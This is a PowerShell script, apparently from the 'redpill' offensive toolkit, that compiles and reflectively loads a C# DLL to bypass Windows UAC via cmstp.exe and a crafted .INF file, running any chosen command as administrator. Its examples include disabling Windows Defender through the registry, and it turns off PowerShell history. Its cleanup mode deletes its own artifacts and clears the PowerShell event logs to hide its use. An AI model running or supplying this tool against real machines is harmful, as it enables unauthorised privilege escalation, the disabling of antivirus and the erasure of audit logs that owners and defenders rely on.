<#
.SYNOPSIS
   UAC bypass|EOP by dll reflection! (cmstp.exe)

   Author: @_zc00l|@r00t-3xp10it
   Tested Under: Windows 10 (18363) x64 bits
   Required Dependencies: Reflection.Assembly {native}
   Optional Dependencies: none
   PS cmdlet Dev version: v1.0.3

.DESCRIPTION
   User Account Control, commonly abbreviated UAC, is a Windows security component introduced
   in Windows Vista and Windows Server 2008. UAC restricts processes access to admin level
   resources and operations as much as possible, unless they are explicitly granted by the user.
   
.NOTES   
   This CmdLet creates\compiles Source.CS into Trigger.dll and performs UAC bypass using native
   PS [Reflection.Assembly]::Load() technic to load our dll and elevate privileges (user->admin)

.Parameter Action
   Accepts arguments: Bypass OR Clean

.Parameter Execute
   Accepts the command to be executed! (cmd|powershell)

.EXAMPLE
   PS C:\> Get-Help .\UacMe.ps1 -full
   Access this cmdlet comment based help

.EXAMPLE
   PS C:\> .\UacMe.ps1 -Action Bypass -Execute "cmd.exe"
   Local spawns an cmd prompt with administrator privileges! 
   
.EXAMPLE
   PS C:\> .\UacMe.ps1 -Action Bypass -Execute "powershell.exe"
   Local spawns an powershell prompt with administrator privileges!   

.EXAMPLE
   PS C:\> .\UacMe.ps1 -Action Bypass -Execute "powershell -file $Env:TMP\redpill.ps1"
   Executes redpill.ps1 script trougth uac bypass module with elevated shell privs {admin}
   
.EXAMPLE
   PS C:\> .\UacMe.ps1 -Action Bypass -Execute "powershell -file $Env:TMP\DisableDefender.ps1 -Action Stop"
   Executes DisableDefender.ps1 script trougth uac bypass module with elevated shell privs {admin}

.EXAMPLE
   PS C:\> .\UacMe.ps1 -Action Clean
   Deletes uac bypass artifacts and powershell eventvwr logs!
   Remark: Admin privileges are required to delete PS logfiles.

.INPUTS
   None. You cannot pipe objects into UacMe.ps1

.OUTPUTS
   Privilege Name                Description                                   State
   ============================= ============================================= ========
   SeShutdownPrivilege           Encerrar o sistema                            Disabled
   SeChangeNotifyPrivilege       Ignorar verificação transversal               Enabled
   SeUndockPrivilege             Remover computador da estação de ancoragem    Disabled
   SeIncreaseWorkingSetPrivilege Aumentar um conjunto de trabalho de processos Disabled
   SeTimeZonePrivilege           Alterar o fuso horário                        Disabled

   UAC State     : Enabled
   UAC Settings  : Notify Me
   ReflectionDll : C:\Users\pedro\AppData\Local\Temp\Trigger.dll
   Execute       : powershell -file C:\Users\pedro\AppData\Local\Temp\redpill.ps1
   
.LINK
   https://github.com/r00t-3xp10it/redpill
   http://woshub.com/run-program-without-admin-password-and-bypass-uac-prompt/
   https://0x00-0x00.github.io/research/2018/10/31/How-to-bypass-UAC-in-newer-Windows-versions.html
#>


## Non-Positional cmdlet named parameters
[CmdletBinding(PositionalBinding=$false)] param(
   [string]$Execute="$PsHome\powershell.exe",
   [string]$Action="False"
)


## Local variable declarations
$OSMajor = [environment]::OSVersion.Version.Major
## Disable Powershell Command Logging for current session.
Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
$Working_Directory = pwd|Select-Object -ExpandProperty Path


If($Action -ieq "False"){## [error] none parameters input by cmdlet user!
   Write-Host "`n`n[error:] This cmdlet requires the use of -parameters to work!" -ForeGroundColor Red -BackGroundColor Black
   Write-Host "[syntax] .\UacMe.ps1 -Action Bypass -Execute`"cmd.exe`"`n`n"
   exit ## Exit @UacMe
}


If($Action -ieq "Bypass"){

   <#
   .SYNOPSIS
      Helper - UAC bypass|EOP by dll reflection! (cmstp.exe)
   
   .DESCRIPTION
      This CmdLet creates\compiles Source.CS into Trigger.dll and performs UAC bypass
      using native Powershell [Reflection.Assembly]::Load(IO) technic to load our dll
      and elevate privileges { user -> admin } or to exec one command with admin privs!
      
   .NOTES
      Required dependencies: Source.sc { auto-Build }
      Required dependencies: Trigger.dll { auto-Build }
      Required dependencies: Reflection.Assembly {native}
   
   .EXAMPLE
      PS C:\> .\UacMe.ps1 -Action Bypass -Execute "powershell.exe"
      Local spawns an powershell prompt with administrator privileges!
      
   .EXAMPLE
      PS C:\> .\UacMe.ps1 -Action Bypass -Execute "powershell -file $Env:TMP\redpill.ps1"
      Execute redpill.ps1 script trougth uac bypass module to elevate shell privileges to admin!
      
   .EXAMPLE
      PS C:\> .\UacMe.ps1 -Action Bypass -Execute "cmd /c Reg Add 'HKLM\Software\Policies\Microsoft\Windows Defender' /v DisableAntiSpyware /t REG_DWORD /d 1 /f"
      Disables Windows Defender { permanent - does not start with PC restart } by adding a registry key to HKLM hive!
   #>
   
   
   ## Delete files left behind by this cmdlet in previous runs!
   If(Test-Path -Path "$Env:TMP\Source.sc" -EA SilentlyContinue){
      Remove-Item -Path "$Env:TMP\Source.sc" -Force
   }
   If(Test-Path -Path "$Env:TMP\Trigger.dll" -EA SilentlyContinue){
      Remove-Item -Path "$Env:TMP\Trigger.dll" -Force  
   }   


## Create Source.cs script
$RawCSScript = @("
/* 
Author: Andre Marques (@_zc00l)
Framework: @redpill - UacMe.ps1
*/

using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Windows;
using System.Runtime.InteropServices;

public class CMSTPvuln
{
// Our .INF file data!
public static string InfData = @`"[version]
Signature=`$chicago$
AdvancedINF=2.5

[DefaultInstall]
CustomDestination=CustInstDestSectionAllUsers
RunPreSetupCommands=RunPreSetupCommandsSection

[RunPreSetupCommandsSection]
; Commands Here will be run Before Setup Begins to install
REPLACE_COMMAND_LINE
taskkill /IM cmstp.exe /F

[CustInstDestSectionAllUsers]
49000,49001=AllUSer_LDIDSection, 7

[AllUSer_LDIDSection]
`"`"HKLM`"`", `"`"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\CMMGR32.EXE`"`", `"`"ProfileInstallPath`"`", `"`"%UnexpectedError%`"`", `"`"`"`"

[Strings]
ServiceName=`"`"CorpVPN`"`"
ShortSvcName=`"`"CorpVPN`"`"

`";

    [DllImport(`"user32.dll`")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    [DllImport(`"user32.dll`", SetLastError = true)] public static extern bool SetForegroundWindow(IntPtr hWnd);

    public static string BinaryPath = `"c:\\windows\\system32\\cmstp.exe`";

    /* Generates a random named .inf file with command to be executed with UAC privileges */
    public static string SetInfFile(string CommandToExecute)
    {
        string RandomFileName = Path.GetRandomFileName().Split(Convert.ToChar(`".`"))[0];
        string TemporaryDir = `"C:\\Windows\\Temp`";
        StringBuilder OutputFile = new StringBuilder();
        OutputFile.Append(TemporaryDir);
        OutputFile.Append(`"\\`");
        OutputFile.Append(RandomFileName);
        OutputFile.Append(`".inf`");
        StringBuilder newInfData = new StringBuilder(InfData);
        newInfData.Replace(`"REPLACE_COMMAND_LINE`", CommandToExecute);
        File.WriteAllText(OutputFile.ToString(), newInfData.ToString());
        return OutputFile.ToString();
    }

    public static bool Execute(string CommandToExecute)
    {
        if(!File.Exists(BinaryPath))
        {
            Console.WriteLine(`"Could not find cmstp.exe binary!`");
            return false;
        }
        StringBuilder InfFile = new StringBuilder();
        InfFile.Append(SetInfFile(CommandToExecute));
        Console.WriteLine(`"Payload file written to `" + InfFile.ToString());
        ProcessStartInfo startInfo = new ProcessStartInfo(BinaryPath);
        startInfo.Arguments = `"/au `" + InfFile.ToString();
        startInfo.UseShellExecute = false;
        Process.Start(startInfo);

        IntPtr windowHandle = new IntPtr();
        windowHandle = IntPtr.Zero;
        do {
            windowHandle = SetWindowActive(`"cmstp`");
        } while (windowHandle == IntPtr.Zero);

        System.Windows.Forms.SendKeys.SendWait(`"{ENTER}`");
        return true;
    }

    public static IntPtr SetWindowActive(string ProcessName)
    {
        Process[] target = Process.GetProcessesByName(ProcessName);
        if(target.Length == 0) return IntPtr.Zero;
        target[0].Refresh();
        IntPtr WindowHandle = new IntPtr();
        WindowHandle = target[0].MainWindowHandle;
        if(WindowHandle == IntPtr.Zero) return IntPtr.Zero;
        SetForegroundWindow(WindowHandle);
        ShowWindow(WindowHandle, 5);
        return WindowHandle;
    }
}
")

   ## Write Source.cs script into %tmp% directory!
   echo "$RawCSScript"|Out-File "$Env:TMP\Source.cs" -encoding ascii -force

   ## Get system User Account Control settings
   # [String]::IsNullOrWhiteSpace((Get-Content -Path "$Env:TMP\lksfdv.log" -EA SilentlyContinue))
   $RawPolicyKey = "HKLM:\Software\Microsoft\" + "Windows\CurrentVersion\" + "policies\system" -Join ''
   $ConsentPromptBehaviorAdmin = (Get-Itemproperty -path "$RawPolicyKey" -EA SilentlyContinue).ConsentPromptBehaviorAdmin
   $ConsentPromptBehaviorUser = (Get-Itemproperty -path "$RawPolicyKey" -EA SilentlyContinue).ConsentPromptBehaviorUser
   $UacStatus = (Get-ItemProperty -Path "$RawPolicyKey" -EA SilentlyContinue).EnableLUA   

   ## Parsing UAC Registry Data
   If($ConsentPromptBehaviorAdmin -ieq "5" -and $ConsentPromptBehaviorUser -ieq "3"){
      $UacSettings = "Notify Me" ## Defaul value
   }ElseIf($ConsentPromptBehaviorAdmin -ieq "0" -and $ConsentPromptBehaviorUser -ieq "0"){
      $UacSettings = "Never Notify"
   }ElseIf($ConsentPromptBehaviorAdmin -ieq "2" -and $ConsentPromptBehaviorUser -ieq "3"){
      $UacSettings = "Allways Notify"
   }Else{## Can NOT retrive reg value
      $UacSettings = "`$null"
   }

   If($UacStatus -ieq "0"){## disabled
      $UacStatus = "Disabled"
   }ElseIf($UacStatus -ieq "1"){## enabled
      $UacStatus = "Enabled"
   }Else{## Can NOT retrive reg value
      $UacStatus = "`$null"
   }


   ## Source.cs script compilation to Trigger.dll and execution { EOP }
   If(Test-Path -Path "$Env:TMP\Source.cs" -EA SilentlyContinue){
   
      Add-Type -TypeDefinition ([IO.File]::ReadAllText("$Env:TMP\Source.cs")) -ReferencedAssemblies "System.Windows.Forms" -OutputAssembly "$Env:TMP\Trigger.dll"
      If(-not(Test-Path -Path "$Env:TMP\Trigger.dll" -EA SilentlyContinue)){## Make sure Trigger.dll as created!

         Write-Host "`n`n[error] $Env:TMP\Trigger.dll not found\created!`n`n" -ForeGroundColor Red -BackGroundColor Black
         exit ## Exit @UacMe
      }

      ## Load Trigger.dll into memory
      [Reflection.Assembly]::Load([IO.File]::ReadAllBytes("$Env:TMP\Trigger.dll"))|Out-Null
      cd $Env:TMP;[CMSTPvuln]::Execute("$Execute")|Out-Null
      cd $Working_Directory ## Return to UacMe working directory!
      
   }Else{## [error] $Env:TMP\Source.cs not found\created!
   
      Write-Host "`n`n[error] $Env:TMP\Source.cs not found\created!`n`n" -ForeGroundColor Red -BackGroundColor Black
      exit ## Exit @UacMe
   
   }


   Write-Host "`n"
   ## Get Shell privileges
   $ShellPriv = whoami /priv
   $ParseData = $ShellPriv -replace 'PRIVILEGES INFORMATION','' -replace '----------------------',''
   echo $ParseData > $Env:TMP\graca.log;Get-Content -Path "$Env:TMP\graca.log" | Where-Object { $_ -ne "" }

   ## Build Output Table
   Write-Host "`nUAC State     : $UacStatus"
   Write-Host "UAC Settings  : $UacSettings"
   Write-Host "ReflectionDll : $Env:TMP\Trigger.dll"
   Write-Host "Execute       : $Execute"
   
   ## Clean ALL artifacts left behind!
   Remove-Item -Path "$Env:TMP\graca.log" -EA SilentlyContinue -Force
   Remove-Item -Path "$Env:TMP\Source.cs" -EA SilentlyContinue -Force
   Remove-Item -Path "$Env:TMP\Trigger.dll" -EA SilentlyContinue -Force  

}


If($Action -ieq "Clean"){

   <#
   .SYNOPSIS
      Helper - Clean ALL artifacts left behind by this cmdlet!
      
   .NOTES
      If UacMe its executed with administrator privileges
      then it deletes eventvwr powershell logfiles also!

      Remark: This function deletes ALL .inf files from 'C:\Windows\Temp'
      directory. if the 'CreationTime' of the files Matches todays date!
   
   .EXAMPLE
      PS C:\> .\UacMe.ps1 -Action Clean
      Clean ALL artifacts left behind by this cmdlet and deletes eventvwr
      powershell logfiles if this cmdlet its executed with admin privileges! 
      
   .EXAMPLE
      PS C:\> .\UacMe.ps1 -Action Bypass -Execute "powershell -file $Env:TMP\UacMe.ps1 -Action Clean"
      Clean ALL artifacts left behind by this cmdlet and delete powershell logfiles using uac bypass technic!
   
   .OUTPUTS
      Artifacts PowershellLogs ShellPrivs
      --------- -------------- ----------
      3         2              Admin
   #>

   [int]$Artifacts = 0
   ## Clean ALL artifacts left behind!
   If(Test-Path -Path "$Env:TMP\Source.cs" -EA SilentlyContinue){
      Remove-Item -Path "$Env:TMP\Source.cs" -EA SilentlyContinue -Force
      $Artifacts = $Artifacts+1 ## Count how many artifacts are cleanned!
   }
   If(Test-Path -Path "$Env:TMP\Trigger.dll" -EA SilentlyContinue){   
      Remove-Item -Path "$Env:TMP\Trigger.dll" -EA SilentlyContinue -Force
      $Artifacts = $Artifacts+1 ## Count how many artifacts are cleanned!
   }
   If(Test-Path -Path "$Env:TMP\graca.log" -EA SilentlyContinue){   
      Remove-Item -Path "$Env:TMP\graca.log" -EA SilentlyContinue -Force
      $Artifacts = $Artifacts+1 ## Count how many artifacts are cleanned!
   }

   
   ## This function deletes ALL .inf files from 'C:\Windows\Temp'
   # directory. If the 'CreationTime' of the files Matches todays date!
   $TodaysSc = Get-date -Format "dd/MM/yyyy" ## Get todays date: 19/04/2021
   $CleanInf = (Get-ChildItem -Path "$Env:WINDIR\temp" | Where-Object { 
      $_.CreationTime.ToString() -Match "$TodaysSc" -and $_.Name -Match '(.inf)$' 
   }).FullName
   ForEach($Item in $CleanInf){## Delete ALL .inf files found from C:\Windows\Temp dir!
      Remove-Item -Path "$Item" -EA SilentlyContinue -Force
      $Artifacts = $Artifacts+1 ## Count how many artifacts are cleanned!
   }
   
   
   [int]$PowershellLogs = 0   
   ## Administrator Privileges cleanning!
   $IsClientAdmin = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
   If($IsClientAdmin){## Clean related eventvwr logfiles

      $CleanPSo = (wevtutil gli "Microsoft-Windows-Powershell/Operational" | Where-Object { 
         $_ -Match 'numberOfLogRecords:' }).split(':')[1] -replace ' ',''

      If($CleanPSo -gt 0){## Delete ALL Powershell LogFiles
         Write-Host "[+] Eventvwr Powershell/Operational Logs Deleted!" -ForeGroundColor Yellow
         wevtutil cl "Microsoft-Windows-Powershell/Operational" | Out-Null
         $PowershellLogs = $PowershellLogs+1 ## Count how many artifacts are cleanned!
      }

      $CleanWPS = (wevtutil gli "Windows Powershell" | Where-Object { 
         $_ -Match 'numberOfLogRecords:' }).split(':')[1] -replace ' ',''

      If($CleanWPS -gt 0){## Delete ALL Powershell LogFiles
         Write-Host "[+] Eventvwr Windows Powershell Logs Deleted!" -ForeGroundColor Yellow
         wevtutil cl "Windows Powershell" | Out-Null
         $PowershellLogs = $PowershellLogs+1 ## Count how many artifacts are cleanned!         
      }

   }
   
   ## read shell current privileges!
   If($IsClientAdmin){$ShellState = "Admin"}Else{$ShellState = "UserLand"}
   
   Write-Host "`n`n"   
   ## Build Output Table
   $mytable = New-Object System.Data.DataTable
   $mytable.Columns.Add("Artifacts")|Out-Null
   $mytable.Columns.Add("PowershellLogs")|Out-Null
   $mytable.Columns.Add("ShellPrivs")|Out-Null   
   $mytable.Rows.Add("$artifacts",
                     "$PowershellLogs",   
                     "$ShellState")|Out-Null

   ## Display Data Table
   $mytable|Format-Table -AutoSize
   Start-Sleep -Seconds 1

}
Write-Host "`n"